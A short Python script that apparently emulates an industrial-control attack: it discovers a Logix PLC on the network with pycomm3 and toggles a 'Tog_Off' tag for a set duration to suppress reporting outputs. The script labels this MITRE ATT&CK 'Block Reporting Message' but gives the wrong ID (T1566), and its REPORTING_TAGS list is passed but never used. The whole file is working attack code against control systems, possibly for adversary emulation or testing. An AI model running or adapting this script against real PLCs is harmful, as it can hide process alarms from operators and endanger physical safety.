import pycomm3
import time
import socket  # Import socket for IP address retrieval

# MITRE ATT&CK Technique: Inhibit Response Function - Block Reporting Message (T1566)

# Configuration - Modify as needed
PLC_CPU_NAME = "Your PLC CPU Name" # Replace with your PLC CPU Name. You can find this from the project tree.
PLC_SLOT = 0 # Adjust if your PLC is in a different slot
REPORTING_TAGS = ["_IO_EM_DO_02", "_IO_EM_DO_07", "_IO_EM_DO_06"]  # Example reporting tags (Fan output, Green LED, Red LED)
BLOCK_DURATION = 10  # Duration to block reporting (seconds)
TOG_OFF_TAG = "Tog_Off"

def get_plc_ip_address(plc_cpu_name):
    """
    Attempts to discover the PLC's IP address by browsing the network.
    """
    try:
        with pycomm3.CIPDriver() as driver:
            devices = driver.discover()
            for device in devices:
                if device.get('product_name') == plc_cpu_name:
                    return device.get('host_address')
            print(f"PLC with CPU name '{plc_cpu_name}' not found during network discovery.")
            return None  # PLC not found
    except Exception as e:
        print(f"Error discovering PLC IP address: {e}")
        return None

def block_reporting(plc_ip_address, slot, reporting_tags, block_duration, tog_off_tag):
    """
    Blocks reporting messages by modifying the Tog_Off tag.
    """
    try:
        with pycomm3.LogixDriver(plc_ip_address, init_route=f"1,{slot}") as plc:
            # Ensure PLC communication is established
            if plc.connected:
                print("Connected to PLC.")

                # Get the current state of Tog_Off
                current_tog_off = plc.read(tog_off_tag).value

                # Flip the Tog_Off bit to effectively "block" reporting based on the PLC logic.
                # Remember the original state so we can restore it.
                plc.write(tog_off_tag, not current_tog_off)
                print(f"Flipped {tog_off_tag} to {not current_tog_off} to block reporting.")

                # Block reporting for the specified duration
                print(f"Blocking reporting for {block_duration} seconds...")
                time.sleep(block_duration)

                # Restore the original Tog_Off state.
                plc.write(tog_off_tag, current_tog_off)
                print(f"Restored {tog_off_tag} to its original state: {current_tog_off}. Reporting is now enabled.")


            else:
                print("Failed to connect to PLC.")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    # Step 1: Discover PLC IP address
    plc_ip = get_plc_ip_address(PLC_CPU_NAME)

    if plc_ip:
        print(f"PLC IP address: {plc_ip}")

        # Step 2: Block Reporting
        block_reporting(plc_ip, PLC_SLOT, REPORTING_TAGS, BLOCK_DURATION, TOG_OFF_TAG)
    else:
        print("Could not determine PLC IP address. Exiting.")